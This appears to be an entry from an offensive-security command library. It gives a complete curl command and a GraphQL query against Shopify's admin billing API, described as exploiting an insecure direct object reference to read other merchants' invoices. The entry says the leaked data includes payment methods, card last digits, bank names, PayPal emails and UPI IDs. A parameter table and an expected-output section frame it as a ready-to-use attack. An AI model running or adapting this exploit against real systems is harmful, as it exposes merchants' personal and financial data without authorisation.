---
data: >
  curl -X POST
  "https://admin.shopify.com/api/shopify/[shop]/graph?operation=BillDetails&type=query"
  -H "Content-Type: application/json" -H "Cookie: [redacted]" -H "User-Agent:
  Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101
  Firefox/110.0" -H "Accept: application/json" -H "X-Shopify-Web-Force-Proxy: 1"
  -H "X-Csrf-Token: [redacted]" -H "Caller-Pathname:
  /store/[shop]/access_account/invoice/[id]" -H "Origin:
  https://admin.shopify.com" -H "Sec-Fetch-Dest: empty" -H "Sec-Fetch-Mode:
  cors" -H "Sec-Fetch-Site: same-origin" -H "X-Pwnfox-Color: cyan" -H "Te:
  trailers" -d
  '{"operationName":"BillDetails","variables":{"id":"[arbitrary_gid]","hasBillingSubscriptionsPermission":false},"query":"query
  BillDetails($id: ID!, $hasBillingSubscriptionsPermission: Boolean!) { shop {
  id myshopifyDomain countryCode createdAt name plan { name __typename }
  easeMerchantFailedBillManualPaymentAttempts: experimentAssignment( name:
  \"ease_merchant_failed_bill_manual_payment_attempts\" ) __typename }
  billingAccount { id subscription @include(if:
  $hasBillingSubscriptionsPermission) { id billingPeriod __typename }
  activePaymentMethod { __typename ... on BillingBankAccount { id bankName
  lastDigits compatibleCurrencies __typename } ... on BillingCreditCard { id
  brand lastDigits compatibleCurrencies __typename } ... on BillingReseller { id
  compatibleCurrencies __typename } ... on BillingPaypalAccount { id email
  compatibleCurrencies __typename } ... on BillingBalance { id
  compatibleCurrencies __typename } ... on BillingShopifyBalanceCard { id
  compatibleCurrencies __typename } ... on BillingManualPayment { id
  compatibleCurrencies __typename } ... on BillingUpiAccount { id upiId
  compatibleCurrencies __typename } } ...BillingPaymentMethods
  validPaymentMethods currency __typename } node(id: $id) { id ... on
  BillingInvoice { id credits { name category invoiceAmount { amount
  currencyCode __typename } __typename } chargeCategories { shopId shopName
  shopDomain category name description count subtotalAmount { amount
  currencyCode __typename } charges { __typename discountValue { __typename ...
  on AppSubscriptionDiscountPercentage { percentage __typename } ... on
  AppSubscriptionDiscountAmount { amount { amount currencyCode __typename }
  __typename } } amount { amount currencyCode __typename } originalAmount {
  amount currencyCode __typename } exchangeRate exchangeRateAt issuedAt
  description title apiClientId feeType hasTraceabilityBetaFlag chargesUrl: url
  } __typename } createdAt billOn dueOn netTerm status name originClassification
  prefixBillName purchaseType authenticationStatus
  strongCustomerAuthenticationPayload { clientToken paymentMethodNonce
  redirectUrl type __typename } lastFailureReason lastFailureMessage totalAmount
  { amount currencyCode __typename } totalCreditAmount { amount currencyCode
  __typename } subtotalAmount { amount currencyCode __typename } refundedAmount
  { amount currencyCode __typename } timeline { status date amount { amount
  currencyCode __typename } __typename } paymentMethod { __typename ... on
  BillingBankAccount { id bankName lastDigits synchronous __typename } ... on
  BillingCreditCard { id brand lastDigits synchronous __typename } ... on
  BillingReseller { id synchronous __typename } ... on BillingPaypalAccount { id
  email synchronous __typename } ... on BillingBalance { id synchronous
  __typename } ... on BillingManualPayment { id synchronous __typename } ... on
  BillingUpiAccount { id upiId synchronous __typename } ... on
  BillingShopifyBalanceCard { id synchronous __typename } } __typename }
  __typename } } fragment BillingPaymentMethods on BillingAccount { id
  paymentMethods { __typename ... on BillingBankAccount { id priority bankName
  lastDigits verificationStatus synchronous compatibleCurrencies __typename }
  ... on BillingCreditCard { id priority brand lastDigits expired expiryMonth
  expiryYear synchronous compatibleCurrencies __typename } ... on
  BillingShopifyBalanceCard { id priority synchronous compatibleCurrencies
  __typename } ... on BillingReseller { id priority uid handle synchronous
  compatibleCurrencies __typename } ... on BillingPaypalAccount { id priority
  email synchronous compatibleCurrencies __typename } ... on BillingBalance { id
  priority synchronous compatibleCurrencies __typename } ... on
  BillingShopifyBalanceAccount { id priority synchronous compatibleCurrencies
  __typename } ... on BillingUpiAccount { id priority upiId synchronous
  compatibleCurrencies __typename } ... on BillingManualPayment { id priority
  synchronous compatibleCurrencies __typename } } __typename } }'}

  output: null

  created_at: "2023-10-01T00:00:00Z"

  updated_at: "2023-10-01T00:00:00Z"

  platforms: ["Web"]

  tags: ["graphql", "idor"]
tags:
  - graphql
  - idor
  - shopify
type: command
output: null
executor: bash
platforms:
  - Web
id: 9f8054aa-19e8-4022-a7a2-d83de2cfc6ec
created_at: '2025-12-14T17:26:00.219Z'
updated_at: '2025-12-14T17:26:00.219Z'
verified: false
validated: true
submitted: true
---
# shopify-graphql-billdetails-query

## Command

```bash
curl -X POST "https://admin.shopify.com/api/shopify/[shop]/graph?operation=BillDetails&type=query" -H "Content-Type: application/json" -H "Cookie: [redacted]" -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0" -H "Accept: application/json" -H "X-Shopify-Web-Force-Proxy: 1" -H "X-Csrf-Token: [redacted]" -H "Caller-Pathname: /store/[shop]/access_account/invoice/[id]" -H "Origin: https://admin.shopify.com" -H "Sec-Fetch-Dest: empty" -H "Sec-Fetch-Mode: cors" -H "Sec-Fetch-Site: same-origin" -H "X-Pwnfox-Color: cyan" -H "Te: trailers" -d '[JSON payload with query]'
```

## Description

Sends a GraphQL query to Shopify's Admin API to fetch BillDetails for an arbitrary BillingInvoice ID, exploiting IDOR to leak other merchants' data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| [shop] | Target shop domain (e.g., yourshop.myshopify.com) | Yes |
| [arbitrary_gid] | Global ID like gid://shopify/BillingInvoice/12345 | Yes |
| Cookie | Authenticated session cookie | Yes |
| X-Csrf-Token | CSRF protection token | Yes |
| hasBillingSubscriptionsPermission | Boolean, set to false | Yes |

## Examples

### Basic Usage

```bash
curl [full command with specific gid]
```

### Advanced Usage

```bash
curl [command] -v  # For verbose debugging
```

## Expected Output

JSON with data { data: { shop: {...}, billingAccount: {...}, node: { ... on BillingInvoice: { id, credits, chargeCategories, ... } } } }, containing leaked PII if IDOR succeeds.

## Related

- [[Related Procedure: Query-Arbitrary-Billing-Invoice-Details-via-GraphQL]]
